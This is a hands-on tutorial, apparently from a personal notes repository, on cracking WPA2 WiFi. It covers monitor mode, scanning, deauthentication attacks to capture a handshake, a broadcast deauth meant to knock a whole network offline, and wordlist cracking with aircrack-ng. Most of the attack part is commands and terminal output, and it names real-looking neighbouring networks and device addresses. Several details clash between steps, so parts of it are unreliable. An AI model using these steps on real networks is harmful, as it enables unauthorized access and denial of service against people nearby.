@@ -1,0 +1,216 @@
+Wifi Hacking
+Key Terms
+
+1) BSSID  --> MAC  address  of  the access point. 
+2) SSID --> The Name of Network.
+3) CH --> Channel number.
+4) WPA2-PSK --> Wifi networks that you connect to by providing a password that's the same for everyone.
+5) WPA2-EAP --> Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
+6) RADIUS --> A server for authenticating clients, not just for wifi.
+7) PWR --> Signal level of Wi-Fi Network.
+8) Beacons --> Number  of  beacons  sent by the AP. Each access point sends about ten beacons per second at the lowest rate (1M), so they can usually be picked up from very far.
+9) Frames -->  The number of data packets sent by the client.
+10) Probes --> Probe requests are a type of WiFi management frame. They are not encrypted, since they contain no user data. They are used simply for network discovery.
+11) IEEE 802.1X -->  This standard defines how devices authenticate themselves before accessing a network. It’s commonly used in corporate networks where user or device authentication is required. When a device wants to join the network, it must prove its identity first.
+12) EAPOL --> EAPOL (Extensible Authentication Protocol over Local Area Network): EAPOL encapsulates EAP packets within Ethernet frames. Initially designed for IEEE 802.3 Ethernet wired networks in 802.1X-2001, it has been adapted for other network types, including IEEE 802.11 wireless (in 802.1X-2004). In wireless networks, EAPOL messages are encapsulated in 802.11 frames.
+13) ARP --> ARP stands for Address Resolution Protocol, which is used to find the MAC address of the device from its known IP address. This means, the source device already knows the IP address but not the MAC address of the destination device. The MAC address of the device is required because you cannot commu
+14) Interface --> External wifi adapter Name / wireless card name.
+15) ENC -->  Type of encryption used commonly used  as WPA2 in this ear and new is WPA3 old is WEP.
+16) Station --> Connected device mac address with AP.
+17) AUTH --> Authentication tupe opn=open ,PSK=pre-shared key ,SHARED = shared secret (password) .
+
+So, How to Do it Take a WIFI Adapter or Mains Linux
+
+$ lsusb 
+	 --> to check for avilable usb device including external adapter
+$ iwconfig 
+	 --> to check wifi adapter showing or not, named by "wlan0" in kali linux.
+# Note if u using any external adapter not showing wlan0 , so maybe it doesn't support linux or driver not installed or avilable. moslty internak wireless card support
+
+# use root terminal u need sudo all time
+Step 1: Make Adapter In Monitor Mode 
+
+ Theri are Two Modes :-
+ 1. Managed Mode  --> it acts as a client device that connects to an Access Point (AP) or a wireless router.
+ 2. Monitor Mode  --> Simply it can see all on going traffic through the air without connecting to any 
+                     network and also receive/send data frames.
+
+ Thier are two ways to do it.
+
+* Way 1 :- Manual way  
+ 1. Down Your Interface
+ $ ifconfig wlan0 down    ------> wlan0 is my Interface
+
+ 2. Change Mode To Monitor.
+ $ iwconfig wlan0 mode Monitor
+ we can verify it using "iwconfig"
+
+ 3. Up Your Interface Again
+ $ ifconfig wlan0mon down
+       or 
+ $ ifconfig wlan0 up (if mon not added)
+
+* Way 2 :-  It lot easier and prefer by all it automated by airmon-ng . Just use this command :
+   $ airmon-ng start wlan0
+
+# In some case of External adapter you can see you interface name changed to wlan0mon or (mon) word will be add to your interface name.
+ and your internal card name is mostly changed that mean you  have made monitor mode enable untill it monitor mode u must give inteface name to be wlan0mon in all process   .
+# If it not mon add in you interface it same. 
+
+Step 2: Kill all On going process which may interfere with monitor mode.
+
+$ airodump-ng start wlan0mon  -----> <interface>mon is created here. 
+
+it scan all network with 2.4Ghz freq bez it a default frequency, To scan all 2.4Ghz freq and 5Ghz freq.
+use :-
+
+$ airodump-ng start wlan0mon --band abg       ----------> (--band) specifies a band (a --> used as 5Ghz)(b,g --> 2.4GHZ ) 
+ 
+┌──(root㉿esther)-[/home/death]
+└─# airodump-ng  wlan0 --band abg 
+
+ CH 122 ][ Elapsed: 18 s ][ 2024-02-17 20:54                                                                                             
+                                                                                                                                         
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                         
+                                                                                                                                         
+ B0:8B:92:95:45:36  -80        6        1    0  64  780   WPA2 CCMP   PSK  Aman_5G                                                       
+ E4:C3:2A:48:34:02  -85       10        0    0  40  866   WPA2 CCMP   PSK  TP-Link                                                       
+ EA:C3:2A:48:34:02  -85       10        0    0  40  866   WPA2 CCMP   PSK  <length:  0>           ----------> Not specifed in ranger aor low freq                                                  
+ B4:3D:08:9B:D5:99  -85        8        0    0  36  866   WPA2 CCMP   PSK  Airtel_Aakash_Golu_5G                                         
+ 5C:64:8E:D6:3A:0D  -65        2        0    0   6  130   WPA2 CCMP   PSK  Airtel_sand_4876                                              
+ 20:0C:86:11:C9:20  -63       11        0    0   5  270   WPA2 CCMP   PSK  Vaishali2.4g                                                                                         
+ B0:8B:92:95:45:34  -53       11        1    0  11  130   WPA2 CCMP   PSK  Aman                                                                                                              
+ B4:3D:08:9B:D5:98  -63        7        0    0   8  270   WPA2 CCMP   PSK  Airtel_Aakash_Golu                                            
+                                             
+                                                                                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                       
+                                                                                                                                         
+ (not associated)   86:12:93:DD:8D:66  -66    0 - 6      0        2                                                                      
+ 64:FB:92:8C:14:78  2C:3B:70:96:FE:51   -9    0 -11      0        9                                                                      
+ FC:22:F4:3B:7D:52  BC:61:93:D7:BD:5F  -71    0 - 1      0        7                                                                      
+ 3C:46:45:1D:5D:31  FE:85:48:FA:1C:93  -71    0 - 1      0        1                                                                      
+Quitting...      
+
+
+Use Ctrl + C to exit or stop scanning
+
+As You see some Aman and Aman_5G are same bez one is 2.4GHZ and other is 5Ghz. both are same but it depend on clint which band support thier device.
+
+Step 3: Focus on One Network To Analyze The Network Traffic and Capture Hanadshake.
+
+As im monitoring on My own second network.
+
+$ airodump-ng wlan0mon -c 1 --bssid B4:3D:08:9B:D5:99 -w /tmp/demo   ------> (-c / --Channel to give Channel number ) ( --bssid mac of target ) (-w  to save captuer handshake in a paticular path or with a name) 
+
+
+┌──(root㉿esther)-[/home/death]
+└─# airodump-ng  wlan0 --bssid B4:3D:08:9B:D5:98 -c 8 -w /tmp/demo
+21:08:44  Created capture file "/tmp/demo-01.cap".
+
+
+ CH  8 ][ Elapsed: 0 s ][ 2024-02-17 21:08                                                                                               
+                                                                                                                                         
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                     
+                                                                                                                                         
+ B4:3D:08:9B:D5:98  -64 100       25        2    0   8  270   WPA2 CCMP   PSK  Airtel_Aakash_Golu                                        
+                                                                                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                       
+                                                                                                                                         
+ B4:3D:08:9B:D5:98  BC:C7:DA:1F:8A:28  -75    0 - 1     11        6                                                                      
+ B4:3D:08:9B:D5:98  54:77:87:8B:BC:64   -1    1e- 0      0       14 
+
+
+Step 4: Capture Hanadshake
+
+So for Capturing handshake someone need to connect  to the targeted AP (Access Point) with his device.
+if some is trying to connect we succesfully captured the 4-way handshake.
+
+so we need to make connect we use Deauthentication attack to force client to disconnect from current AP and then re Connect to it 
+So we get 4-way handshake
+
+to make a deauth attack open new terminal and use following commands:-
+
+$ aireplay-ng wlan0mon -a B4:3D:08:9B:D5:98 -c BC:C7:DA:1F:8A:28 --deauth 10  -----> ( -a is used for  Access point MAC Address, -c is used for Client Device MAC Address ) (-c for a single client address given in station ) (--deauth / -0  to specifies a attack mode  10 number of packet ,0 is for infinite packet )
+
+┌──(root㉿esther)-[/home/death]
+└─# aireplay-ng wlan0 -a B4:3D:08:9B:D5:98 -c E0:01:C7:67:DF:FB  --deauth 10 
+21:20:01  Waiting for beacon frame (BSSID: 7E:46:85:FF:86:9B) on channel 6
+21:20:02  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [47|62 ACKs]
+21:20:02  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [ 0|64 ACKs]
+21:20:03  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [ 4|64 ACKs]
+21:20:04  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [ 0|61 ACKs]
+21:20:05  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [ 0|63 ACKs][ 0|42 ACKs]
+21:20:06  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [43|63 ACKs][ 6|19 ACKs]
+21:20:06  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [63|63 ACKs]
+21:20:07  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [63|61 ACKs]
+21:20:08  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [63|62 ACKs]
+21:20:09  Sending 64 directed DeAuth (code 7). STMAC: [E0:01:C7:67:DF:FB] [60|61 ACKs]
+
+
+Attack is success and we got handshake 4-way handshake
+
+
+# To make dos on whole network.
+
+┌──(root㉿esther)-[/home/death]
+└─# aireplay-ng wlan0 -a B4:3D:08:9B:D5:98  --deauth 0   
+21:25:54  Waiting for beacon frame (BSSID: B4:3D:08:9B:D5:98 ) on channel 7
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+21:25:55  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:55  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:56  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:56  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:57  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:58  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:59  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:25:59  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:26:00  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:26:00  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:26:01  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+21:26:02  Sending DeAuth (code 7) to broadcast -- BSSID: [B4:3D:08:9B:D5:98 ]
+
+
+And here the Handshake 
+
+┌──(root㉿esther)-[/home/death]
+└─# airodump-ng  wlan0 --bssid B4:3D:08:9B:D5:98  -c 6 -w /tmp/demo
+21:19:59  Created capture file "/tmp/demo-01.cap".
+
+ CH  6 ][ Elapsed: 1 min ][ 2024-02-17 21:21 ][ WPA handshake: B4:3D:08:9B:D5:98                                                         
+                                                                                                                                         
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                     
+                                                                                                                                         
+ B4:3D:08:9B:D5:98  -65   0      152     1208   11   8   65   WPA2 CCMP   PSK  Airtel_Aakash_Golu                                           
+                                                                                                                                         
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                       
+                                                                                                                                         
+ B4:3D:08:9B:D5:98  82:DF:A0:3A:2F:60  -58   24e-24e    10      646                                                                      
+ B4:3D:08:9B:D5:98  E0:01:C7:67:DF:FB  -59   24e-24e     9     1216  EAPOL                                                               
+Quitting...                                                                                                                              
+               
+
+Step 5: Crack Handshake
+As we go to location where er save handshake  
+mine is tmp folder
+
+                                                                                                                                         
+┌──(root㉿esther)-[~]
+└─# cd /tmp ;ls
+
+demo-01.cap            
+demo-01.csv            
+demo-01.kismet.csv     
+demo-01.kismet.netxml  
+demo-01.log.csv    
+
+this all are different file formate
+but we use .cap file where our handshake have been captured and it wireshark file.
+
+
+to crack we use
+
+$ aircrack-ng demo-01.cap -w /usr/share/wordlists/rockyou.txt -----> (demo is my file name with .cap extention  and (-w) to give wordlist path )
+
+
+let start to crack.
